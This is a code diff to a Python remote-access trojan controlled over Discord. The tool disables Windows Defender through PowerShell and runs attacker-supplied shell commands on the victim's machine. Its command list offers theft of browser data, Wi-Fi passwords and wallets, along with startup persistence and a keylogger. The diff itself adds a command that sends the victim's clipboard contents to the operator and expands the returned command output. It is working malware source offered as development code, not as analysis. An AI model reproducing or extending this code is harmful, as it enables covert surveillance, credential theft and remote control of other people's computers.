@@ -7,14 +7,14 @@ from modules.browser import run, delete_files
 #from modules.keylogger import Keylogger
 from modules.info import start
 from modules.wifi import WifiPasswords
-#from dotenv import load_dotenv
+from pyperclip import paste
 
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
     cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
     try:
-        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+        subprocess.run(["powershell", "-Command", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
     except:
         pass
     
@@ -28,7 +28,6 @@ def error():
 if ERROR:
     error()
 
-#load_dotenv()
 
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
@@ -42,6 +41,7 @@ commands = "\n".join([
     "help - Help command",
     "ping - Ping command",
     "sys - System information",
+    "clipboard - Return clipboard content",
     "cd - Change directory",
     "ls - List directory",
     "cwd - Get current working directory",
@@ -56,6 +56,7 @@ commands = "\n".join([
     "startup - Add to startup",
     "browser - Get browser data",
     "wallet - Get wallet information",
+    "keylogger - Enable keylogger",
     "!exit - Exit session and delete all data"
 ])
 
@@ -177,10 +178,20 @@ async def on_message(message):
             with open("system.txt", "r") as f:
                 system_info = f.read()
 
-            embed = discord.Embed(title="System Information", description="", color=0xfafafa)
-            embed.add_field(name="", value=f"```{system_info}```", inline=False)
+            embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
             await message.channel.send(embed=embed)
             delete_files(["system.txt"])
+    
+    elif message.content == "clipboard":
+            try:
+                clipboard = paste()
+            except:
+                clipboard = "Unknown"
+            if clipboard == "":
+                clipboard = "null"
+            
+            embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
+            await message.reply(embed=embed)
     
     elif message.content.startswith("cd"):
         directory = message.content[3:] #.split(" ")[1]
@@ -222,10 +233,18 @@ async def on_message(message):
 
     elif message.content.startswith("cmd"):
         command = message.content[4:]
-        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode("utf-8")
-        if output == "":
-            output = "No output"
-        embed = discord.Embed(title=f"CMD > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
+        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+        error_output = output[1].decode("utf-8")
+        normal_output = output[0].decode("utf-8")
+        
+        embed = discord.Embed(title=f"CMD > \n{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
+        
+        if normal_output != "":
+            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
+            
+        if error_output != "":
+            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
+            
         await message.reply(embed=embed)
 
     elif message.content.startswith("run"):
